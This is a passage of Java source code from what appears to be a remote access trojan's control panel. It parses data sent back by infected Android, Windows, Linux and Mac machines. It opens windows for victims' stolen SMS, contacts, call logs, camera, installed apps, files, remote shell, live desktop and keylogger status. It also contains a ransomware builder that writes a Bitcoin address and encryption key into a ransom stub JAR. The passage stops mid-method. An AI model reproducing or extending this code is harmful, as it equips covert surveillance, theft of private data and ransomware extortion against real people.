	private static ArrayList<Android_File_Manager> Open_FM_Android = new ArrayList<Android_File_Manager>();
	private static ArrayList<Android_SMS_Manager> Open_SMS_Android = new ArrayList<Android_SMS_Manager>();
	private static ArrayList<Android_Cam_Manager> Open_Cam_Android = new ArrayList<Android_Cam_Manager>();
	private static ArrayList<Android_SMS_Manager> Open_Keylog_Android = new ArrayList<Android_SMS_Manager>();
	private static ArrayList<Android_Calls_Manager> Open_Calls_Android = new ArrayList<Android_Calls_Manager>();
	private static ArrayList<Android_Contacts_Manager> Open_Contacts_Android = new ArrayList<Android_Contacts_Manager>();
	private static ArrayList<Android_Chat_Manager> Open_Chat_Android = new ArrayList<Android_Chat_Manager>();
	private static ArrayList<Android_Apps_Manager> Open_Apps_Android = new ArrayList<Android_Apps_Manager>();
	
	
	
	
	
	protected static ArrayList<File_Manager_VB> Get_Open_FM_VB(){
		return Open_FM_VB;
	}
	
	private static  void Build_Ransom_Out(String outpath,String Bicoin,String Extention,String Key_enc){
		try {
			if(outpath.endsWith(".jar") ==false){
				outpath += ".jar";
			}
			JarInputStream tJarInStream = new JarInputStream(Master.class
					.getResourceAsStream("/pkg_bot/ransom_stub.jar"));
			JarOutputStream tJarOutStream = new JarOutputStream(new FileOutputStream(
					outpath), tJarInStream.getManifest());

			Properties tProp = new Properties();

			tProp.put("BitCoin",Bicoin);
			tProp.put("Extention",Extention);
			tProp.put("Key",Key_enc);

			ByteArrayOutputStream t = new ByteArrayOutputStream();

			tProp.store(t, "XPR Ransomware Configuration");

			tJarOutStream.putNextEntry(new JarEntry("config.properties"));
			tJarOutStream.write(t.toByteArray());
			tJarOutStream.closeEntry();

			byte[] tArrBuff = new byte[1024];
			JarEntry entry;

			while ((entry = tJarInStream.getNextJarEntry()) != null) {
				if ("META-INF/MANIFEST.MF".equals(entry.getName())) {
					continue;
				}

				tJarOutStream.putNextEntry(entry);
				int i;

				while ((i = tJarInStream.read(tArrBuff)) > -1) {
					tJarOutStream.write(tArrBuff, 0, i);
				}

				tJarOutStream.closeEntry();
			}

			tJarOutStream.flush();
			tJarOutStream.close();
			tJarInStream.close();
		 
			
			//Jcrypt(sFilePath);
					} catch (Exception e) {
			 
			
		}
	}
	public static void Raise_Data(String Data,String sock){
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);

		if (Data.isEmpty()==false){
			 
			if (Data.contains("b4x7004x700x4b")||Data.contains("phone")||Data.contains("wallpaper")&&Data.contains("Java_Victim")==false){
			//	 System.out.println("Data : " + Data + " Raised From " + sock);
				 if(Data.startsWith("824x828200x0c")){
					Data = Data.replace("824x828200x0c", "c2x2824x828200x0c");
				 }
				Data = Data.replace("c2x2824x828200x0c", "");
				
				String bs64 = Data;
				if(Data.contains("b4x7004x700x4b")&&Data.contains("phone")&&Data.contains("wallpaper")){
					Data = Data.replace("b4x7004x700x4b", YY);
					Data = Data.replace("fxf0x4x4x0fxf", YY);
					bs64 = SplitString(Data).get(2);
				}
				Data = Data.replace("b4x7004x700x4b", YY);
				Data = Data.replace("fxf0x4x4x0fxf", YY);
				// System.out.println("\nData : " + Data + " Raised From " + sock);
				 //System.out.println("APPS" + Data);
				 if(Data.contains("yps.eton.application")&&Data.contains("applications")==false){
					Data = "applications" + YY + Data;
				 }
			  if(Data.contains("phone")&&Data.contains("wallpaper")){
			
				
				bs64 = bs64.replace("phone", "");
				bs64 = bs64.replace("fxf0x4x4x0fxf", "");
				bs64 = bs64.replace("wallpaper", "");
				bs64 = bs64.replace("c0c1c3a2c0c1c", "");
				  bs64 = bs64.replace(YY, "");
				// = System.out.println("Data : " + bs64 );
				  Image Rec_img = null;
				  try{//c2x2824x828200x0cphonefxf0x4x4x0fxfwallpaperc0c1c3a2c0c1c
					  byte[] imageBytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(bs64);
					 
					  BufferedImage img = ImageIO.read(new ByteArrayInputStream(imageBytes));
					  Rec_img = img;
					//  screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Rec_img).getImage().getScaledInstance(screen.getWidth()/4 + 60, screen.getHeight(), Image.SCALE_FAST)));
					  screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Rec_img).getImage().getScaledInstance(100 , screen.getHeight()-30, Image.SCALE_FAST)));
					  screen.repaint();
					  form.repaint();
				  }catch(Exception ex){   }
				  
				  
				 
				  return;
				 } 
				  switch (SplitString(Data).get(0)){
				  
				  case "info":
					  
					
					  // screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Master.class.getResource("Tool ScreenShot.png")).getImage().getScaledInstance(screen.getWidth()/4 + 20, screen.getHeight(), Image.SCALE_SMOOTH)));
					
					    if (SplitString(Data).get(4).contains("sdk")||SplitString(Data).get(4).equals("sdk")){
					    System.out.println("\n i android : "  + " Raised From " + sock + SplitString(Data).get(2)+ SplitString(Data).get(6) );//"IMEI" + " / " +SplitString(Data).get(6)
					    	  yourAddRow("null",SplitString(Data).get(3),sock,"Android","Android / APK : " + SplitString(Data).get(3),"IMEI" + " / " +SplitString(Data).get(6),"APK Trojan is Running on Android ",SplitString(Data).get(2));
					    	  j.repaint();
							 sp.updateUI();
							 form.repaint();
					    	
					     }
					
					  break ; 
				  
				  case "shell_terminal":
				
						
							  
								try {
									terminal_command instance_fm = null;
							 
									  for (terminal_command opn : Open_Shells){
											if(opn.Get_sock().equals(sock)){
												 
													instance_fm = opn;
													
												    break;
												 
											}
									  }
									  if(instance_fm==null){
										  //System.out.println("here" + Data);
										  instance_fm = new terminal_command(sock);
											 if (Open_Shells.contains(instance_fm)==false){
												 
												  instance_fm.Do_frame();
												  
												  Open_Shells .add(instance_fm);
											  } 
											
											   
									  }else{
											 if (Open_Shells.contains(instance_fm)==false){
											 
												//  instance_fm.Do_frame();
											 
												  Open_Shells .add(instance_fm);
											  } else{
												//Remove_Form_Shells(sock);
											//	instance_fm= new terminal_command(sock);
												 
											//	  instance_fm.Do_frame();
												 
												  Open_Shells .add(instance_fm);
												   
												  
											  }
									  }
									  //
									  instance_fm.get_form().setVisible(true);
									  for (terminal_command opn : Open_Shells){
											if(opn.Get_sock().equals(sock)){
												opn.Perform_data("android_shell"+"c2x2824x828200x0c"+SplitString(Data).get(2).replace(" (", "\n(")+"c2x2824x828200x0c");
											//	opn.Perform_data("android_shell"+"c2x2824x828200x0c"+SplitString(Data).get(2).replace(" (", "\n(")+"c2x2824x828200x0c");
											 
											}
										}
								} catch (Exception e) {

									 
								}
							  
							  
							  
							  
								  if (Open_Forms.contains("open_shell" + sock) ==false ){
							
							  Open_Forms.add("open_shell" + sock);
							  
						}
						break;
						
						
				  case "camera_manager":
					  
					  
						// System.out.println(Data); 
						  Android_Cam_Manager instance_cam = null;
							try {
								
						
								  for (Android_Cam_Manager opn : Open_Cam_Android){
										if(opn.Get_sock().equals(sock)){
											 	instance_cam = opn;
											    break;
											 }
								  }
								  if(instance_cam==null){
								
									  
									  instance_cam = new Android_Cam_Manager(sock);
									  String Cameras[] = SplitString(Data).get(2).split("9xf89fff9xf89");
									  for(String camera_drive :Cameras){
										   String Cam_data[] = camera_drive.split("c0c1c3a2c0c1c");
										   String cam_name = Cam_data[0];
										   String cam_id = Cam_data[1];
										   if(instance_cam.camlist.contains(cam_name + "cam_split"  +cam_id + "cam_split")==false){
											   instance_cam.camlist.add(cam_name + "cam_split"  +cam_id + "cam_split");
										   }
									  }
									 
									  instance_cam.Do_frame();
									// "c0c1c3a2c0c1c"
										 if (Open_Cam_Android.contains(instance_cam)==false){
											
											
											 Open_Cam_Android .add(instance_cam);
										  }
										   
								  }else{
									  instance_cam.Do_frame();
									  if (Open_Cam_Android.contains(instance_cam)==false){
											
											
										  Open_Cam_Android .add(instance_cam);
										  }
									  instance_cam.get_form().setVisible(true);
									  instance_cam.get_form().repaint();
								  }
								  String Cameras[] = SplitString(Data).get(2).split("9xf89fff9xf89");
								  for(String camera_drive :Cameras){
									   String Cam_data[] = camera_drive.split("c0c1c3a2c0c1c");
									   String cam_name = Cam_data[0];
									   String cam_id = Cam_data[1];
									   if(instance_cam.camlist.contains(cam_name + "cam_split"  +cam_id + "cam_split")==false){
										   instance_cam.camlist.add(cam_name + "cam_split"  +cam_id + "cam_split");
									   }
								  }
								  instance_cam.Do_frame();
								/*  String MESSAGES[] = SplitString(Data).get(2).split("c0c1c3a2c0c1c");
								  if( MESSAGES[0] .contains("writ")||MESSAGES[0].equals("write")){
									 instance_cam.get_DIR().setText("Victim is Typing now : "+MESSAGES[1]);
									  instance_cam.get_DIR().repaint();
									  instance_cam.get_form().repaint();
								  }else{
									  instance_cam.get_DIR().setText("");
									  instance_cam.get_DIR().repaint();
									  if(MESSAGES[1].equals("null")==false){
										  instance_cam.Add_from_victim(MESSAGES[1]);
									  } instance_cam.get_form().repaint();
								  }*/
								 
								
							} catch (Exception e) {
								 System.out.println("Cam ex  " +e.getLocalizedMessage());
							}
						  
						  
				  if (Open_Forms.contains("open_cam" + sock) ==false ){	
						
							  Open_Forms.add("open_cam" + sock);
						  }
						  break;
							
							 
				  case "chat":
					  
						  
					// System.out.println(Data); 
					  Android_Chat_Manager instance_chat = null;
						try {
							
					
							  for (Android_Chat_Manager opn : Open_Chat_Android){
									if(opn.Get_sock().equals(sock)){
										 	instance_chat = opn;
										    break;
										 }
							  }
							  if(instance_chat==null){
							
								  
								  instance_chat = new Android_Chat_Manager(sock);
								  instance_chat.Do_frame();
								// "c0c1c3a2c0c1c"
									 if (Open_Chat_Android.contains(instance_chat)==false){
										
										
										 Open_Chat_Android .add(instance_chat);
									  }
									   
							  }else{
								// instance_chat.Do_frame();
								  if (Open_Chat_Android.contains(instance_chat)==false){
										
										
										 Open_Chat_Android .add(instance_chat);
									  }
								  instance_chat.get_form().setVisible(true);
								  instance_chat.get_form().repaint();
							  }
							  String MESSAGES[] = SplitString(Data).get(2).split("c0c1c3a2c0c1c");
							  if( MESSAGES[0] .contains("writ")||MESSAGES[0].equals("write")){
								 instance_chat.get_DIR().setText("Victim is Typing now : "+MESSAGES[1]);
								  instance_chat.get_DIR().repaint();
								  instance_chat.get_form().repaint();
							  }else{
								  instance_chat.get_DIR().setText("");
								  instance_chat.get_DIR().repaint();
								  if(MESSAGES[1].equals("null")==false){
									  instance_chat.Add_from_victim(MESSAGES[1]);
								  } instance_chat.get_form().repaint();
							  }
							 
							
						} catch (Exception e) {
							 System.out.println("CH ex  " +e.getLocalizedMessage());
						}
					  
					  
			  if (Open_Forms.contains("open_chat" + sock) ==false ){	
					
						  Open_Forms.add("open_chat" + sock);
					  }
					  break;
						
						 
				  case "sms_manager":
					
							// System.out.println(Data); 
						  Android_SMS_Manager instance_sms = null;
							try {
								
						
								  for (Android_SMS_Manager opn : Open_SMS_Android){
										if(opn.Get_sock().equals(sock)){
											 	instance_sms = opn;
											    break;
											 }
								  }
								  if(instance_sms==null){
								
									  
									  instance_sms = new Android_SMS_Manager(sock);
									  instance_sms.Do_frame();
									  instance_sms.get_row_index();
										 if (Open_SMS_Android.contains(instance_sms)==false){
											 String MESSAGES[] = SplitString(Data).get(2).split("9xf89fff9xf89");
											 for (String linemsg:MESSAGES){
												// System.out.println(linemsg); 
											 	 String MSGS[] = linemsg.split("c0c1c3a2c0c1c");
											 	instance_sms.Add_SMS(MSGS[0], MSGS[1], MSGS[2], MSGS[3]);
											 }
												Open_SMS_Android .add(instance_sms);
										  }else{
											  String MESSAGES[] = SplitString(Data).get(2).split("9xf89fff9xf89");
												 for (String linemsg:MESSAGES){
													// System.out.println(linemsg); 
												 	 String MSGS[] = linemsg.split("c0c1c3a2c0c1c");
												 	instance_sms.Add_SMS(MSGS[0], MSGS[1], MSGS[2], MSGS[3]);
												 }
										  }
										
										   
								  }else{
									 instance_sms.get_form().setVisible(true);
									 String MESSAGES[] = SplitString(Data).get(2).split("9xf89fff9xf89");
									  instance_sms.get_row_index();
										 for (String linemsg:MESSAGES){
											// System.out.println(linemsg); 
										 	 String MSGS[] = linemsg.split("c0c1c3a2c0c1c");
										 	 
										 	instance_sms.Add_SMS(MSGS[0], MSGS[1], MSGS[2], MSGS[3]);
										 }
										 
								  }
								
							} catch (Exception e) {
								 System.out.println("FM ex  " +e.getLocalizedMessage());
							}
						  
						  
						  
						  
			  if (Open_Forms.contains("open_sms" + sock) ==false ){	
						
						  Open_Forms.add("open_sms" + sock);
					  }
					  break;
				  case "contacts_manager":
					
						// System.out.println("contacts_manager"  + Data); 
						  Android_Contacts_Manager instance_contacts = null;
							try {
								
						
								  for (Android_Contacts_Manager opn : Open_Contacts_Android){
										if(opn.Get_sock().equals(sock)){
											instance_contacts = opn;
											    break;
											 }
								  }
								  if(instance_contacts==null){
								
									  
									  instance_contacts = new Android_Contacts_Manager(sock);
									  instance_contacts.Do_frame();
									  instance_contacts.get_row_index();
										 if (Open_Contacts_Android.contains(instance_contacts)==false){
											 String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
											 for (String linemsg:Mcontca){
											
											 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
												   
											 	 instance_contacts.Add_contacts(McontcaS[0], McontcaS[1]);
											 }
											 Open_Contacts_Android .add(instance_contacts);
										  }else{
											  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
												 for (String linemsg:Mcontca){
													// System.out.println(linemsg); 
												 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
												  instance_contacts.Add_contacts(McontcaS[0], McontcaS[1]);
												 }
										  }
										
										   
								  }else{
									 // instance_sms.Do_frame();
									  instance_contacts.get_row_index();
									  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
									 
										 for (String linemsg:Mcontca){
											// System.out.println(linemsg); 
										 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
										 	 System.out.println(McontcaS[0]);
										 	 instance_contacts.Add_contacts(McontcaS[0], McontcaS[1]);
										 
										 }
										 
								  }
								
							} catch (Exception e) {
								 System.out.println("FM ex  " +e.getLocalizedMessage());
							}
						  
						  
						  
						  
			 if (Open_Forms.contains("open_contacts" + sock) ==false ){				
						
						  Open_Forms.add("open_contacts" + sock);
					  }
					  break;
				  case "calls_manager":
					  
					

							
							// System.out.println("contacts_manager"  + Data); 
							  Android_Calls_Manager instance_calllogs = null;
								try {
									
							
									  for (Android_Calls_Manager opn : Open_Calls_Android){
											if(opn.Get_sock().equals(sock)){
												instance_calllogs = opn;
												    break;
												 }
									  }
									  if(instance_calllogs==null){
									
										  
										  instance_calllogs = new Android_Calls_Manager(sock);
										  instance_calllogs.Do_frame();
										  instance_calllogs.get_row_index();
											 if (Open_Calls_Android.contains(instance_calllogs)==false){
												 String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
												 for (String linemsg:Mcontca){
												
												 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
												 	instance_calllogs.Add_SMS(McontcaS[0], McontcaS[1],McontcaS[2], McontcaS[3]);
												 }
												 Open_Calls_Android.add(instance_calllogs);
											  }else{
												  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
													 for (String linemsg:Mcontca){
														// System.out.println(linemsg); 
													 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
													 	instance_calllogs.Add_SMS(McontcaS[0], McontcaS[1],McontcaS[2], McontcaS[3]);
												 
													 }
											  }
											
											   
									  }else{
										  instance_calllogs.Do_frame();
										  instance_calllogs.get_row_index();
										  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
										 
											 for (String linemsg:Mcontca){
												// System.out.println(linemsg); 
											 	 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
											 	 System.out.println(McontcaS[0]);
											 	instance_calllogs.Add_SMS(McontcaS[0], McontcaS[1],McontcaS[2], McontcaS[3]);
											 
											 }
											 
									  }
									
								} catch (Exception e) {
									 System.out.println("FM ex  " +e.getLocalizedMessage());
								}
							  
							  	if (Open_Forms.contains("open_calllogs" + sock) ==false ){
							  
							  
							  Open_Forms.add("open_calllogs" + sock);
						  }
						  break;
				  case "applications":
				
 // System.out.println("applications"  + Data); 
						  Android_Apps_Manager instance_appsmanager = null;
							try {
								
						
								  for (Android_Apps_Manager opn : Open_Apps_Android){
										if(opn.Get_sock().equals(sock)){
											instance_appsmanager = opn;
											    break;
											 }
								  }
								  if(instance_appsmanager==null){
										 
									  
									  instance_appsmanager = new Android_Apps_Manager(sock);
									  instance_appsmanager.Do_frame();
									  instance_appsmanager.get_row_index();
									  
										 if (Open_Apps_Android.contains(instance_appsmanager)==false){
											 String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
											 for (String linemsg:Mcontca){
										  
												 try{
													 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
													   	instance_appsmanager.Add_AppS(McontcaS[2], McontcaS[0],McontcaS[1], McontcaS[3], McontcaS[4]);
												 } catch (Exception e) {}
											 	 
											 }
											 Open_Apps_Android.add(instance_appsmanager);
										  }else{
											  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
												 for (String linemsg:Mcontca){
													 try{
														 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
														   	instance_appsmanager.Add_AppS(McontcaS[2], McontcaS[0],McontcaS[1], McontcaS[3], McontcaS[4]);
													 } catch (Exception e) {}
												 }
										  }
										
										   
								  }else{
									 // instance_sms.Do_frame();
									  instance_appsmanager.get_row_index();
									  String Mcontca[] = SplitString(Data).get(2).split("9xf89fff9xf89");
									 
										 for (String linemsg:Mcontca){
											 try{
												 String McontcaS[] = linemsg.split("c0c1c3a2c0c1c");
												   	instance_appsmanager.Add_AppS(McontcaS[2], McontcaS[0],McontcaS[1], McontcaS[3], McontcaS[4]);
											 } catch (Exception e) {}
										 }
										 
								  }
								
							} catch (Exception e) {
								 System.out.println("FM ex  " +e.getLocalizedMessage());
							}
						  
						  
						  
						  
						
							  if (Open_Forms.contains("open_appsins" + sock) ==false ){
						  Open_Forms.add("open_appsins" + sock);
					  }
					
					 
						  break;
				  case"file_manager":
					
					  if (Open_Forms.contains("open_fm" + sock) ==false ){
						  Android_File_Manager instance_fm = null;
							try {
								
						
								  for (Android_File_Manager opn : Open_FM_Android){
										if(opn.Get_sock().equals(sock)){
											System.out.println("\nhere form");
												instance_fm = opn;
											    break;
											 
										}
								  }
								  if(instance_fm==null){
									//  System.out.println("here" + Data);
									  
									  instance_fm = new Android_File_Manager(sock);
										 if (Open_FM_Android.contains(instance_fm)==false){
											 // instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											  instance_fm.get_DIR().setText("/");
							            	  instance_fm.get_DIR().repaint();
												System.out.println("\nhere added");
											  Open_FM_Android .add(instance_fm);
										  } 
										
										   
								  }/*else{
									  System.out.println("\nhere else");
										if (Open_FM_Android.contains(instance_fm)==true){
											//  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											  System.out.println("\nhere else false");
											   
										  } else{
											Remove_Form_FileManager_Android(sock);
											instance_fm= new Android_File_Manager(sock);
											//  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											 
											  Open_FM_Android .add(instance_fm);
											   
											  
										  }
								  }*/
								
							} catch (Exception e) {
								 System.out.println("FM ex  " +e.getLocalizedMessage());
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("open_fm" + sock);
						  
						  String []REC_ARY = SplitString(Data).get(2).split("e1x1114x61114e");
						  // System.out.println("FM FFf " +SplitString(Data).get(2));
						  String parent_path = REC_ARY[0].replace("9xf89fff9xf89", "");
			              String []parent_path_ary = parent_path.split("c0c1c3a2c0c1c");
			              
			              String final_parent = parent_path_ary[parent_path_ary.length - 1];
			              
			              instance_fm.Set_File_Sep(REC_ARY[REC_ARY.length-1]);
			     		
			              for (String x : REC_ARY){
			            	  if (x.contains("c0c1c3a2c0c1c")==false){
			            		 // instance_fm.Add_Folder( x.split("c0c1c3a2c0c1c")[1],  x.split("c0c1c3a2c0c1c")[0]);
			            	 // instance_fm.Add_Folder(x.replace(final_parent + REC_ARY[REC_ARY.length-1], ""), "0");
			            		 // instance_fm.Add_Folder(x,"File Folder");
									 //re command exe trojan 
									 
			            		//  System.out.println("FM FFf " +x.replace(final_parent + REC_ARY[REC_ARY.length-1], ""));
			            	  }else{
			            		  String []X_ARY =x.split("9xf89fff9xf89");
				            	  for(String z : X_ARY){
				            		  if(z.length()>1){
				            			  String []folders_name_filexnumb_extention = z.split("c0c1c3a2c0c1c");
				            			  
				            			  
				            			   if(folders_name_filexnumb_extention[0].contains("Folder")){
				            				   instance_fm.Add_Folder(folders_name_filexnumb_extention[1], folders_name_filexnumb_extention[0]);
				            				  // System.out.println("FM FFf " +folders_name_filexnumb_extention[0]);
				            				  // instance_fm.Add_Folder(folders_name_filexnumb_extention[1], "0");
				            				   // folders_name_filexnumb_extention(1)//name
				            				   //
				            			   }else if(folders_name_filexnumb_extention[0].equals("Ext")){
				            				 //  System.out.println("FM FFf " +z);//z.replace("Ext", "").split("c0c1c3a2c0c1c")[0]
				            				   instance_fm.Add_File(folders_name_filexnumb_extention[1],folders_name_filexnumb_extention[2]);
				            				  // System.out.println("FM FFf " +folders_name_filexnumb_extention[0]);
				            				   //folders_name_filexnumb_extention(1) //name 
				            				   //folders_name_filexnumb_extention(2) //size long
				            				   //instance_fm.Add_File(folders_name_filexnumb_extention[1], folders_name_filexnumb_extention[2]);
				            			   }
				            		  }else{
				            			  String []X_ARY2 = x.split("c0c1c3a2c0c1c");
				            			  for(String zx:X_ARY2){
				            				  if(zx.length()>1){
				            					  String []folders_name_filexnumb_extention = zx.split("9xf89fff9xf89");
				            					  if (folders_name_filexnumb_extention[0].contains("N/")==false && folders_name_filexnumb_extention[0].contains("-1")==false && folders_name_filexnumb_extention[0].contains("file")==false && folders_name_filexnumb_extention[0].contains("/")==false){
				            						  //folders_name_filexnumb_extention(0)
				            						 //  instance_fm.Add_Folder(folders_name_filexnumb_extention[0], "0");
				            						  // System.out.println("FM FFf " +zx);
				            					  }
				            				  }
				            			  }
				            		  }
				            	  }
			            	  }
			            	 
			              }
					} 
					 
					  break;
			 	   default:
						
						bs64 = bs64.replace("phone", "");
						bs64 = bs64.replace("fxf0x4x4x0fxf", "");
						bs64 = bs64.replace("wallpaper", "");
						bs64 = bs64.replace("c0c1c3a2c0c1c", "");
						  bs64 = bs64.replace(YY, "");
						//  System.out.println("Data : " + bs64 );
						  Image Rec_img = null;
						  try{//c2x2824x828200x0cphonefxf0x4x4x0fxfwallpaperc0c1c3a2c0c1c
							  byte[] imageBytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(bs64);
							 
							  BufferedImage img = ImageIO.read(new ByteArrayInputStream(imageBytes));
							  Rec_img = img;
							  screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Rec_img).getImage().getScaledInstance(100 , screen.getHeight()-30, Image.SCALE_FAST)));
							  
							  screen.repaint();
							  form.repaint();
						  }catch(Exception ex){   }
						  
						  
						 
						  return; 
					 
				  }
				 
			}else{
			
			
			
			if (Data.contains("c2x2824x828200x0c")){
				Data = Data.replace("c2x2824x828200x0c", YY);
				// System.out.println("Data : " + Data + " Raised From " + sock);
				 if (Data.contains("VB-trojan")&&Data.contains("info")){
					 Data = Data.substring(2,Data.length());
				 }
				  switch (SplitString(Data).get(0)){
				  case "fastscreen":
					  String endcoded = Data.replace("fastscreen", "");
					  endcoded = endcoded .replace("c2x2824x828200x0c", "");
					  endcoded = endcoded .replace(YY, "");
					  Image Rec_img = null;
					  try{
						  byte[] imageBytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(endcoded);
						  BufferedImage img = ImageIO.read(new ByteArrayInputStream(imageBytes));
						  Rec_img = img;
						  screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Rec_img).getImage().getScaledInstance(screen.getWidth()/4 + 60, screen.getHeight(), Image.SCALE_FAST)));
						  screen.repaint();
					  }catch(Exception ex){   }
					  
					  
					  break;
				  case "info":
					  // screen.setIcon(new ImageIcon(new javax.swing.ImageIcon(Master.class.getResource("Tool ScreenShot.png")).getImage().getScaledInstance(screen.getWidth()/4 + 20, screen.getHeight(), Image.SCALE_SMOOTH)));
					
					     if (SplitString(Data).get(2).contains("VB")){
					    	 System.out.println(Data);
					    	 
					    	 yourAddRow("null",SplitString(Data).get(2),sock,SplitString(Data).get(4),SplitString(Data).get(5),"EXE Trojan on Windows PC","USER : " + SplitString(Data).get(3) + "\n" +  "/Trojan : EXE Trojan"+ " / " +SplitString(Data).get(6),getCode(SplitString(Data).get(4)));
							 j.repaint();
							 
						     sp.updateUI();
							 form.repaint();
					     }else if (SplitString(Data).get(2).contains("Java")){
					    	 if(SplitString(Data).get(6).contains("win-")){
					    		 yourAddRow("null",SplitString(Data).get(2),sock,SplitString(Data).get(4),SplitString(Data).get(5),"Windows PC / USER : " + SplitString(Data).get(3),"Jar Trojan is Running on Windows PC" + " / " +SplitString(Data).get(6),SplitString(Data).get(7));
								 j.repaint();
								 sp.updateUI();
								 form.repaint();
					    	 }else  if(SplitString(Data).get(6).contains("linu")){
					    		 yourAddRow("null",SplitString(Data).get(2),sock,SplitString(Data).get(4),SplitString(Data).get(5),"Linux OS / USER : " + SplitString(Data).get(3),"Jar Trojan is Running on Linux"+ " / " +SplitString(Data).get(6) ,SplitString(Data).get(7));
								 j.repaint();
								 sp.updateUI();
								 form.repaint();
					    	 }else  if(SplitString(Data).get(6).contains("mac")){
					    		 yourAddRow("null",SplitString(Data).get(2),sock,SplitString(Data).get(4),SplitString(Data).get(5),"MAC OS / USER : " + SplitString(Data).get(3),"Jar Trojan is Running on MAC"  + " / " +SplitString(Data).get(6) ,SplitString(Data).get(7));
								 j.repaint();
								 sp.updateUI();
								 form.repaint();
					    	 }else  if(SplitString(Data).get(6).contains("solari".toUpperCase())){
					    		 yourAddRow("null",SplitString(Data).get(2),sock,SplitString(Data).get(4),SplitString(Data).get(5),"solaris".toUpperCase()+" OS / USER : " + SplitString(Data).get(3),"Jar Trojan is Running on "+ "solaris".toUpperCase() + " / " +SplitString(Data).get(6),SplitString(Data).get(7));
								 j.repaint();
								 sp.updateUI();
								 form.repaint();
					    	 }
					    	
					     }
					 
					   j.validate();
					   form.repaint();
					  break ; 
				  case "key_logger_update":
					  //
						 for(int row = 0;row < j.getRowCount();row++) {
					  for(int col = 0;col < j.getColumnCount();col++) {
						 
				 	    	if (j.getModel().getValueAt(row, 2) == sock){
				 	    		 // new MessageBox().infoBox(str1, str2);
				 	    		 //remo_row(str1,str2);
				 	    		j.getModel().setValueAt("Keyloggger : Installed", row, 7);
				 	    		j.validate();
				 	    		form.repaint();
				 	    		 
				 	    	}
				 	      }
				 	}
					  break;
					  
				  case "fm" :
					  //"open temp Form here"
					  //System.out.println("Data : " + Data + " Raised From " + sock);
					  if (Open_Forms.contains("open_fm" + sock) ==false ){
						  
							try {
								File_Manager_VB instance_fm = null;
						  // System.out.println("here" + Data);
								  for (File_Manager_VB opn : Open_FM_VB){
										if(opn.Get_sock().equals(sock)){
											 
												instance_fm = opn;
											    break;
											 
										}
								  }
								  if(instance_fm==null){
									  System.out.println("here" + Data);
									  instance_fm = new File_Manager_VB(sock);
										 if (Open_FM_VB.contains(instance_fm)==false){
											  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_FM_VB .add(instance_fm);
										  } 
										
										   
								  }else{
										 if (Open_FM_VB.contains(instance_fm)==false){
											  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_FM_VB .add(instance_fm);
										  } else{
											Remove_Form_FileManager_VB(sock);
											instance_fm= new File_Manager_VB(sock);
											  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_FM_VB .add(instance_fm);
											   
											  
										  }
								  }
								
							} catch (Exception e) {

								  
								  /*File_Manager_VB instance_fm = new File_Manager_VB(sock);
								  if (Open_FM_VB.contains(instance_fm)==false){
									  instance_fm.Set_File_Sep(SplitString(Data).get(2).replace("fs", ""));
									  instance_fm.Do_frame();
									  instance_fm.command();
									  Open_FM_VB .add(instance_fm);
								  }*/
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("open_fm" + sock);
						  
					}
					  break;
				  case "desktop":
					  //"open temp Form here"
					  //System.out.println("Data : " + Data + " Raised From " + sock);
					  if (Open_Forms.contains("desktop_Vb" + sock) ==false ){
						  int W = Integer.parseInt(SplitString(Data).get(2));
						  int H = Integer.parseInt(SplitString(Data).get(3));
						  Desktop_VB instance_d = new Desktop_VB(sock,W,H);
						  if (Open_Desktops_VB.contains(instance_d)==false){
							  Open_Desktops_VB .add(instance_d);
						  }
						
						
						  Open_Forms.add("desktop_Vb" + sock);
						  
					}
					  break;
				  case "@":
					 // System.out.println("xx : "  + " Raised From " + sock);
						for (Desktop_VB opn : Open_Desktops_VB){
						
							if(opn.Get_sock().equals(sock)){
								 opn.Perform_data(Data);
								//System.out.print("VB to : " + sock);
								System.out.print("desktop : " + opn.Get_sock());
								 break;
							}
						}
					  break;
				  case "flashaya" :
					  //if (Open_Forms.contains("open_fm" + sock) ==true ){
						  
							for (File_Manager_VB opn : Open_FM_VB){
								//System.out.print("VB to : " + sock);
							//	System.out.print("VB opn : " + opn.Get_sock());
								if(opn.Get_sock().equals(sock)){
									opn.Perform_data(Data);
								 
								}
							}
						  
						   
					 // }
					  break;
					  
				  case "drive" :
					//  if (Open_Forms.contains("open_fm" + sock) ==true ){
						   
							for (File_Manager_VB opn : Open_FM_VB){
